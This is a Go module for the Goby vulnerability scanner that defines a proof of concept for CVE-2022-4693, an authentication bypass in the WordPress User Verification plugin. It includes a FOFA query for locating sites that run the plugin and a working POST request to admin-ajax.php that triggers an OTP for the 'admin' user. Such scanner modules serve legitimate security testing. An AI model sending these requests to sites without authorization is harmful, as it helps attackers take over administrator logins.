package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress plugins User Verification Authentication Bypass Vulnerability (CVE-2022-4693)",
    "Description": "<p>WordPress plugins User Verification is a plugin to protect your website from spam users and block instant access by using spam email addresses.</p><p>There is an authorization problem vulnerability in WordPress plugins User Verification before version 1.0.94. The vulnerability stems from the fact that login verification can be bypassed.</p>",
    "Product": "WordPress-plugins-User-Verification",
    "Homepage": "https://wordpress.org/plugins/user-verification/",
    "DisclosureDate": "2023-01-30",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"wp-content/plugins/user-verification\"",
    "GobyQuery": "body=\"wp-content/plugins/user-verification\"",
    "Level": "2",
    "Impact": "<p>There is an authorization problem vulnerability in WordPress plugins User Verification before version 1.0.94. The vulnerability stems from the fact that login verification can be bypassed.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/user-verification/.\">https://wordpress.org/plugins/user-verification/.</a></p>",
    "References": [
        "https://lana.codes/lanavdb/eeabe1d3-6f64-400a-8fb2-0865efdf6957/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-admin/admin-ajax.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action=user_verification_send_otp&user_login=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "OTP has been sent successfully",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "otp_via_mail\":true,",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-admin/admin-ajax.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action=user_verification_send_otp&user_login=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "OTP has been sent successfully",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "otp_via_mail\":true,",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2022-4693"
    ],
    "CNNVD": [
        "CNNVD-202301-1699"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "WordPress User Verification 插件 user_verification_send_otp 页面认证绕过漏洞（CVE-2022-4693）",
            "Product": "WordPress-plugins-User-Verification",
            "Description": "<p>WordPress plugins User Verification 是一款用于保护您的网站免受垃圾邮件用户的侵害，并通过使用垃圾邮件电子邮件地址阻止即时访问的插件。<br></p><p>WordPress plugins User Verification 1.0.94 版本之前存在授权问题漏洞，该漏洞源于登陆验证可以被绕过。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://wordpress.org/plugins/user-verification/\">https://wordpress.org/plugins/user-verification/</a>。<br></p>",
            "Impact": "<p>WordPress plugins User Verification 1.0.94 版本之前存在授权问题漏洞，该漏洞源于登陆验证可以被绕过。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "WordPress plugins User Verification Authentication Bypass Vulnerability (CVE-2022-4693)",
            "Product": "WordPress-plugins-User-Verification",
            "Description": "<p>WordPress plugins User Verification is a plugin to protect your website from spam users and block instant access by using spam email addresses.<br></p><p>There is an authorization problem vulnerability in WordPress plugins User Verification before version 1.0.94. The vulnerability stems from the fact that login verification can be bypassed.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/user-verification/.\">https://wordpress.org/plugins/user-verification/.</a><br></p>",
            "Impact": "<p>There is an authorization problem vulnerability in WordPress plugins User Verification before version 1.0.94. The vulnerability stems from the fact that login verification can be bypassed.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10796"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}